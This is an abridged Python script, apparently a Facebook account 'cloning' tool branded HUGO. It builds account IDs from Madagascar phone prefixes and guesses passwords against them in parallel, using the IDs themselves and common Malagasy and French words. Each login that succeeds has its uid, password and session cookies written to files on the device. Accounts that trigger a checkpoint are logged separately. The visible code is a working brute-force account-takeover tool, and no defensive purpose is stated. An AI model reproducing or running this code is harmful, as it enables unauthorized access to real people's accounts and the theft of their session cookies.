...
{warna}--------------------------------------------{B}
 ...
 STATUE : {H}FREE{H}
 Facebook : {bblue}Hugo Shelby{bblue}
...
def BD_CLONING():
    ...
    print(' 261=0 Madagascar : [032] [034] [038] [033] [039]')
    ...
    with tred(max_workers=30) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fitahiana','sariaka','Sariaka','Sitraka', 'sitraka', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'mendrika', 'iloveyou', 'jetaime', 'fandresena', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[HUGO-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    # Vérifier si le dossier HUGO-IDS existe et le créer si nécessaire
                    if not os.path.exists("/sdcard/HUGO-IDS"):
                        os.makedirs("/sdcard/HUGO-IDS")
                    # Enregistrer dans le fichier HUGO-OK.txt
                    with open(os.path.join("/sdcard/HUGO-IDS", "HUGO-OK.txt"), 'a') as f:
                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[HUGO-CP] '+ids+' | '+pas+'\033[1;37m')
                # Enregistrer dans le fichier HUGO-CP.txt
                with open(os.path.join("/sdcard/HUGO-IDS", "HUGO-CP.txt"), 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
...
# Appel à la fonction HUGO pour démarrer le programme
HUGO()
